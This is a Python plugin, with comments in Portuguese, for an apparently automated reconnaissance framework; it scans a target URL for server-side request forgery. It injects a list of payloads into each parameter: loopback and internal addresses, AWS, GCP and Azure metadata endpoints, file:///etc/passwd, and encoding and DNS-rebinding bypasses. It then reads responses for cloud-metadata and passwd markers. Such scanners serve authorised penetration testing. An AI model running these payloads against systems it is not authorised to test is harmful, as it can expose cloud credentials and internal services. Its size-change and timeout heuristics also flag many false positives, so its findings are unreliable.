#!/usr/bin/env python3
"""
SSRF Scanner Plugin - Detecta vulnerabilidades de Server-Side Request Forgery
"""

import requests
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
import sys
sys.path.append('..')
from plugin_system import PluginInterface


class SSRFScannerPlugin(PluginInterface):
    """Plugin para detectar SSRF vulnerabilities."""

    name = "ssrf_scanner"
    version = "1.0.0"
    author = "Auto Recon System"
    description = "Automated SSRF (Server-Side Request Forgery) vulnerability scanner"
    category = "vuln_scan"
    requires = ["requests"]

    # Payloads SSRF
    PAYLOADS = [
        # Localhost
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://2130706433",  # Decimal IP for 127.0.0.1

        # Internal networks
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",

        # Cloud metadata (AWS)
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/",

        # Cloud metadata (GCP)
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata/computeMetadata/v1/",

        # Cloud metadata (Azure)
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

        # File protocol (if supported)
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",

        # Protocol bypass attempts
        "http://127.1",
        "http://127.0.1",
        "http://0177.0.0.1",  # Octal
        "http://0x7f.0x0.0x0.0x1",  # Hex

        # DNS rebinding protection bypass
        "http://localtest.me",  # Resolves to 127.0.0.1
        "http://lvh.me",  # Also resolves to localhost

        # URL encoding bypass
        "http://127.0.0.1%00.example.com",
        "http://127.0.0.1#.example.com",
    ]

    # Indicadores de SSRF bem-sucedido
    SSRF_INDICATORS = [
        # AWS metadata
        b'ami-id',
        b'instance-id',
        b'instance-type',
        b'security-groups',

        # GCP metadata
        b'kube-env',
        b'service-accounts',

        # Azure metadata
        b'subscriptionId',
        b'resourceGroupName',

        # Local file access
        b'root:x:0:0',
        b'[extensions]',

        # Common internal services
        b'Redis',
        b'MySQL',
        b'PostgreSQL',
    ]

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Escaneia URL para SSRF.

        Args:
            target: URL alvo
            **kwargs:
                method: GET|POST (default: GET)
                params: Parâmetros (opcional)
                timeout: Timeout (default: 10)
                callback_url: URL de callback para detecção (opcional)

        Returns:
            Dicionário com vulnerabilidades
        """
        method = kwargs.get('method', 'GET').upper()
        params = kwargs.get('params', {})
        timeout = kwargs.get('timeout', 10)
        callback_url = kwargs.get('callback_url')

        print(f"[*] Scanning {target} for SSRF vulnerabilities...")

        vulnerabilities = []

        # Parse URL
        parsed = urlparse(target)

        # Extrai parâmetros se não fornecidos
        if not params:
            params = parse_qs(parsed.query)
            params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}

        if not params:
            print("[!] No parameters found to test")
            return {
                'vulnerabilities': [],
                'count': 0,
                'message': 'No parameters to test'
            }

        # Testa cada parâmetro
        for param_name in params.keys():
            print(f"[*] Testing parameter: {param_name}")

            vuln = self._test_parameter(
                target, param_name, params,
                method, timeout, callback_url
            )

            if vuln:
                vulnerabilities.append(vuln)
                print(f"[!] VULNERABLE! Parameter: {param_name}")

        print(f"\n[+] Found {len(vulnerabilities)} SSRF vulnerabilities")

        self.results = vulnerabilities

        return {
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities),
            'target': target
        }

    def _test_parameter(self, base_url: str, param_name: str, params: dict,
                       method: str, timeout: int, callback_url: str) -> Dict:
        """Testa um parâmetro para SSRF."""

        # Primeiro, baseline request
        try:
            if method == 'GET':
                baseline = requests.get(base_url, params=params, timeout=timeout, verify=False)
            else:
                baseline = requests.post(base_url, data=params, timeout=timeout, verify=False)

            baseline_length = len(baseline.content)
            baseline_time = baseline.elapsed.total_seconds()
        except:
            baseline_length = 0
            baseline_time = 0

        # Testa cada payload
        for payload in self.PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                start_time = time.time()

                if method == 'GET':
                    response = requests.get(
                        base_url,
                        params=test_params,
                        timeout=timeout,
                        verify=False
                    )
                else:
                    response = requests.post(
                        base_url,
                        data=test_params,
                        timeout=timeout,
                        verify=False
                    )

                elapsed = time.time() - start_time

                # Verifica indicadores de SSRF
                is_vulnerable, indicator = self._check_ssrf_indicators(
                    response.content,
                    baseline_length,
                    elapsed,
                    baseline_time
                )

                if is_vulnerable:
                    return {
                        'type': 'ssrf',
                        'severity': 'critical',
                        'url': base_url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'description': f'SSRF vulnerability in parameter "{param_name}"',
                        'impact': 'Attacker can make requests to internal systems',
                        'remediation': 'Validate and whitelist allowed URLs/IPs',
                        'evidence': {
                            'indicator': indicator,
                            'response_length': len(response.content),
                            'response_time': elapsed,
                            'status_code': response.status_code
                        }
                    }

            except requests.exceptions.Timeout:
                # Timeout pode indicar que request está aguardando
                # (Ex: tentando conectar em serviço interno que não responde)
                return {
                    'type': 'ssrf_timeout',
                    'severity': 'high',
                    'url': base_url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'description': f'Possible SSRF in parameter "{param_name}" (timeout)',
                    'impact': 'Server may be making requests to payload URL',
                    'remediation': 'Validate and whitelist allowed URLs/IPs',
                    'evidence': {
                        'indicator': 'request_timeout',
                        'timeout_seconds': timeout
                    }
                }

            except:
                pass

        # Se tiver callback URL, testa com ele
        if callback_url:
            test_params = params.copy()
            test_params[param_name] = callback_url

            try:
                print(f"[*] Testing with callback URL: {callback_url}")

                if method == 'GET':
                    response = requests.get(
                        base_url,
                        params=test_params,
                        timeout=timeout,
                        verify=False
                    )
                else:
                    response = requests.post(
                        base_url,
                        data=test_params,
                        timeout=timeout,
                        verify=False
                    )

                print(f"[*] Request sent. Check callback server for incoming requests.")

            except:
                pass

        return None

    def _check_ssrf_indicators(self, content: bytes, baseline_length: int,
                               elapsed: float, baseline_time: float) -> tuple:
        """Verifica indicadores de SSRF bem-sucedido."""

        # Verifica por keywords específicas no conteúdo
        for indicator in self.SSRF_INDICATORS:
            if indicator in content:
                return True, f"keyword: {indicator.decode('utf-8', errors='ignore')}"

        # Verifica mudança significativa no tamanho da resposta
        if baseline_length > 0:
            size_diff = abs(len(content) - baseline_length)
            if size_diff > 100:  # Diferença > 100 bytes
                return True, f"response_size_change: {size_diff} bytes"

        # Verifica tempo de resposta muito maior (pode indicar request interna)
        if baseline_time > 0:
            if elapsed > (baseline_time + 2):  # 2+ segundos a mais
                return True, f"response_time_increase: +{elapsed - baseline_time:.2f}s"

        return False, ""
